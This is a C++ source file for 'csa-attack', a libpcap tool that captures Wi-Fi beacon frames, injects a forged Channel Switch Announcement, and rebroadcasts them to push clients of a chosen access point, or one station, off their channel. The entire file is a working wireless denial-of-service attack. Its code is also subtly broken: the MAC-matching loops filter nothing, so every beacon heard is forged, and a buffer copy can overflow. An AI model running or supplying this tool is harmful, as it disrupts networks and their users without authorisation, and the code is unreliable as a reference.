#include <cstdio>
#include <pcap.h>
#include <cstdint>
#include <chrono>
#include <thread>
#include <cstdlib>
#include "radiotap.h"

using namespace std;

void usage() {
	printf("syntax : csa-attack <interface> <ap mac> [<station mac>]\n");
	printf("sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char* argv[]) {
	if (argc != 3 && argc != 4) {
		usage();
		return -1;
	}

    char* dev = argv[1];
    uint8_t StationMAC[6];
    uint8_t APMAC[6];
    sscanf(argv[2], "%x:%x:%x:%x:%x:%x", &APMAC[0], &APMAC[1], &APMAC[2], &APMAC[3], &APMAC[4], &APMAC[5]);

	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    int res;
    chrono::milliseconds sleepDuration(10);

    if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }

    Radiotap radiotap;
    CSAParameter csaParameter;

    while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
        
		struct Radiotap* radiotap = (struct Radiotap*)packet;
        struct Dot11Frame* dot11Frame = (struct Dot11Frame*)(packet + radiotap->len);
        
        if (dot11Frame->type == 0x80) {
            if ((radiotap->channelFlag & 0x0080) == 0x0080) {
                csaParameter.newChannelNumber = (((radiotap->channelFreq - 2412) / 5) + 1 + 5) % 15;
            }
            else if ((radiotap->channelFlag & 0x0100) == 0x0100) {
                csaParameter.newChannelNumber = ((((radiotap->channelFreq - 5160) / 5) + 8) % 142) + 32;
            }

            struct BeaconFrame* beaconFrame = (struct BeaconFrame*)(packet + radiotap->len);

            switch (argc) {
            case 3: {
                for (int i = 0; i < 6; i++) {
                    if ((beaconFrame->sourAddr[i] != APMAC[i]) || (beaconFrame->BSSID[i] != APMAC[i])) {
                        break;
                    }
                }

                for (int i = 0; i < 6; i++) {
                    beaconFrame->destAddr[i] = 0xff;
                }

                break;
            }
            case 4: {
                sscanf(argv[3], "%x:%x:%x:%x:%x:%x", &StationMAC[0], &StationMAC[1], &StationMAC[2], &StationMAC[3], &StationMAC[4], &StationMAC[5]);

                for (int i = 0; i < 6; i++) {
                    if ((beaconFrame->sourAddr[i] != APMAC[i]) || (beaconFrame->BSSID[i] != APMAC[i])) {
                        break;
                    }
                }

                for (int i = 0; i < 6; i++) {
                    beaconFrame->destAddr[i] = StationMAC[i];
                }

                break;
            }
            default:
                break;
            }

            TestPacket testPacket = {
                *radiotap,
                *beaconFrame
            };

            struct TaggedParameter* taggedParameter;
            taggedParameter = (struct TaggedParameter*)(packet + radiotap->len + 36);
            int offset = 0;
            int paramLength = 0;
            int packetLen = header->len + 5;
            int taggedParametersSize = header->len - sizeof(testPacket.radiotap) - sizeof(testPacket.beaconFrame) + 5;

            unsigned char* taggedParameters = (unsigned char*)malloc(sizeof(unsigned char) * (taggedParametersSize));

            while (true) {
                if (taggedParameter->tagNumber < 0x25) {
                    paramLength = 2 + taggedParameter->len;
                    offset += paramLength;
 
                    taggedParameter = (struct TaggedParameter*)(packet + radiotap->len + 36 + offset);
                }
                else {
                    int lenToFixed = radiotap->len + 36;

                    memcpy(taggedParameters, packet + lenToFixed, offset);
                    memcpy(taggedParameters + offset, &csaParameter, 5);
                    memcpy(taggedParameters + offset + 5, packet + lenToFixed + offset, header->len - lenToFixed - offset);

                    memcpy(testPacket.taggedParameters, taggedParameters, taggedParametersSize);

                    break;
                }
            }

            res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&testPacket), packetLen);
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }

            free(taggedParameters);

            this_thread::sleep_for(sleepDuration);
        }
    }

	pcap_close(pcap);
}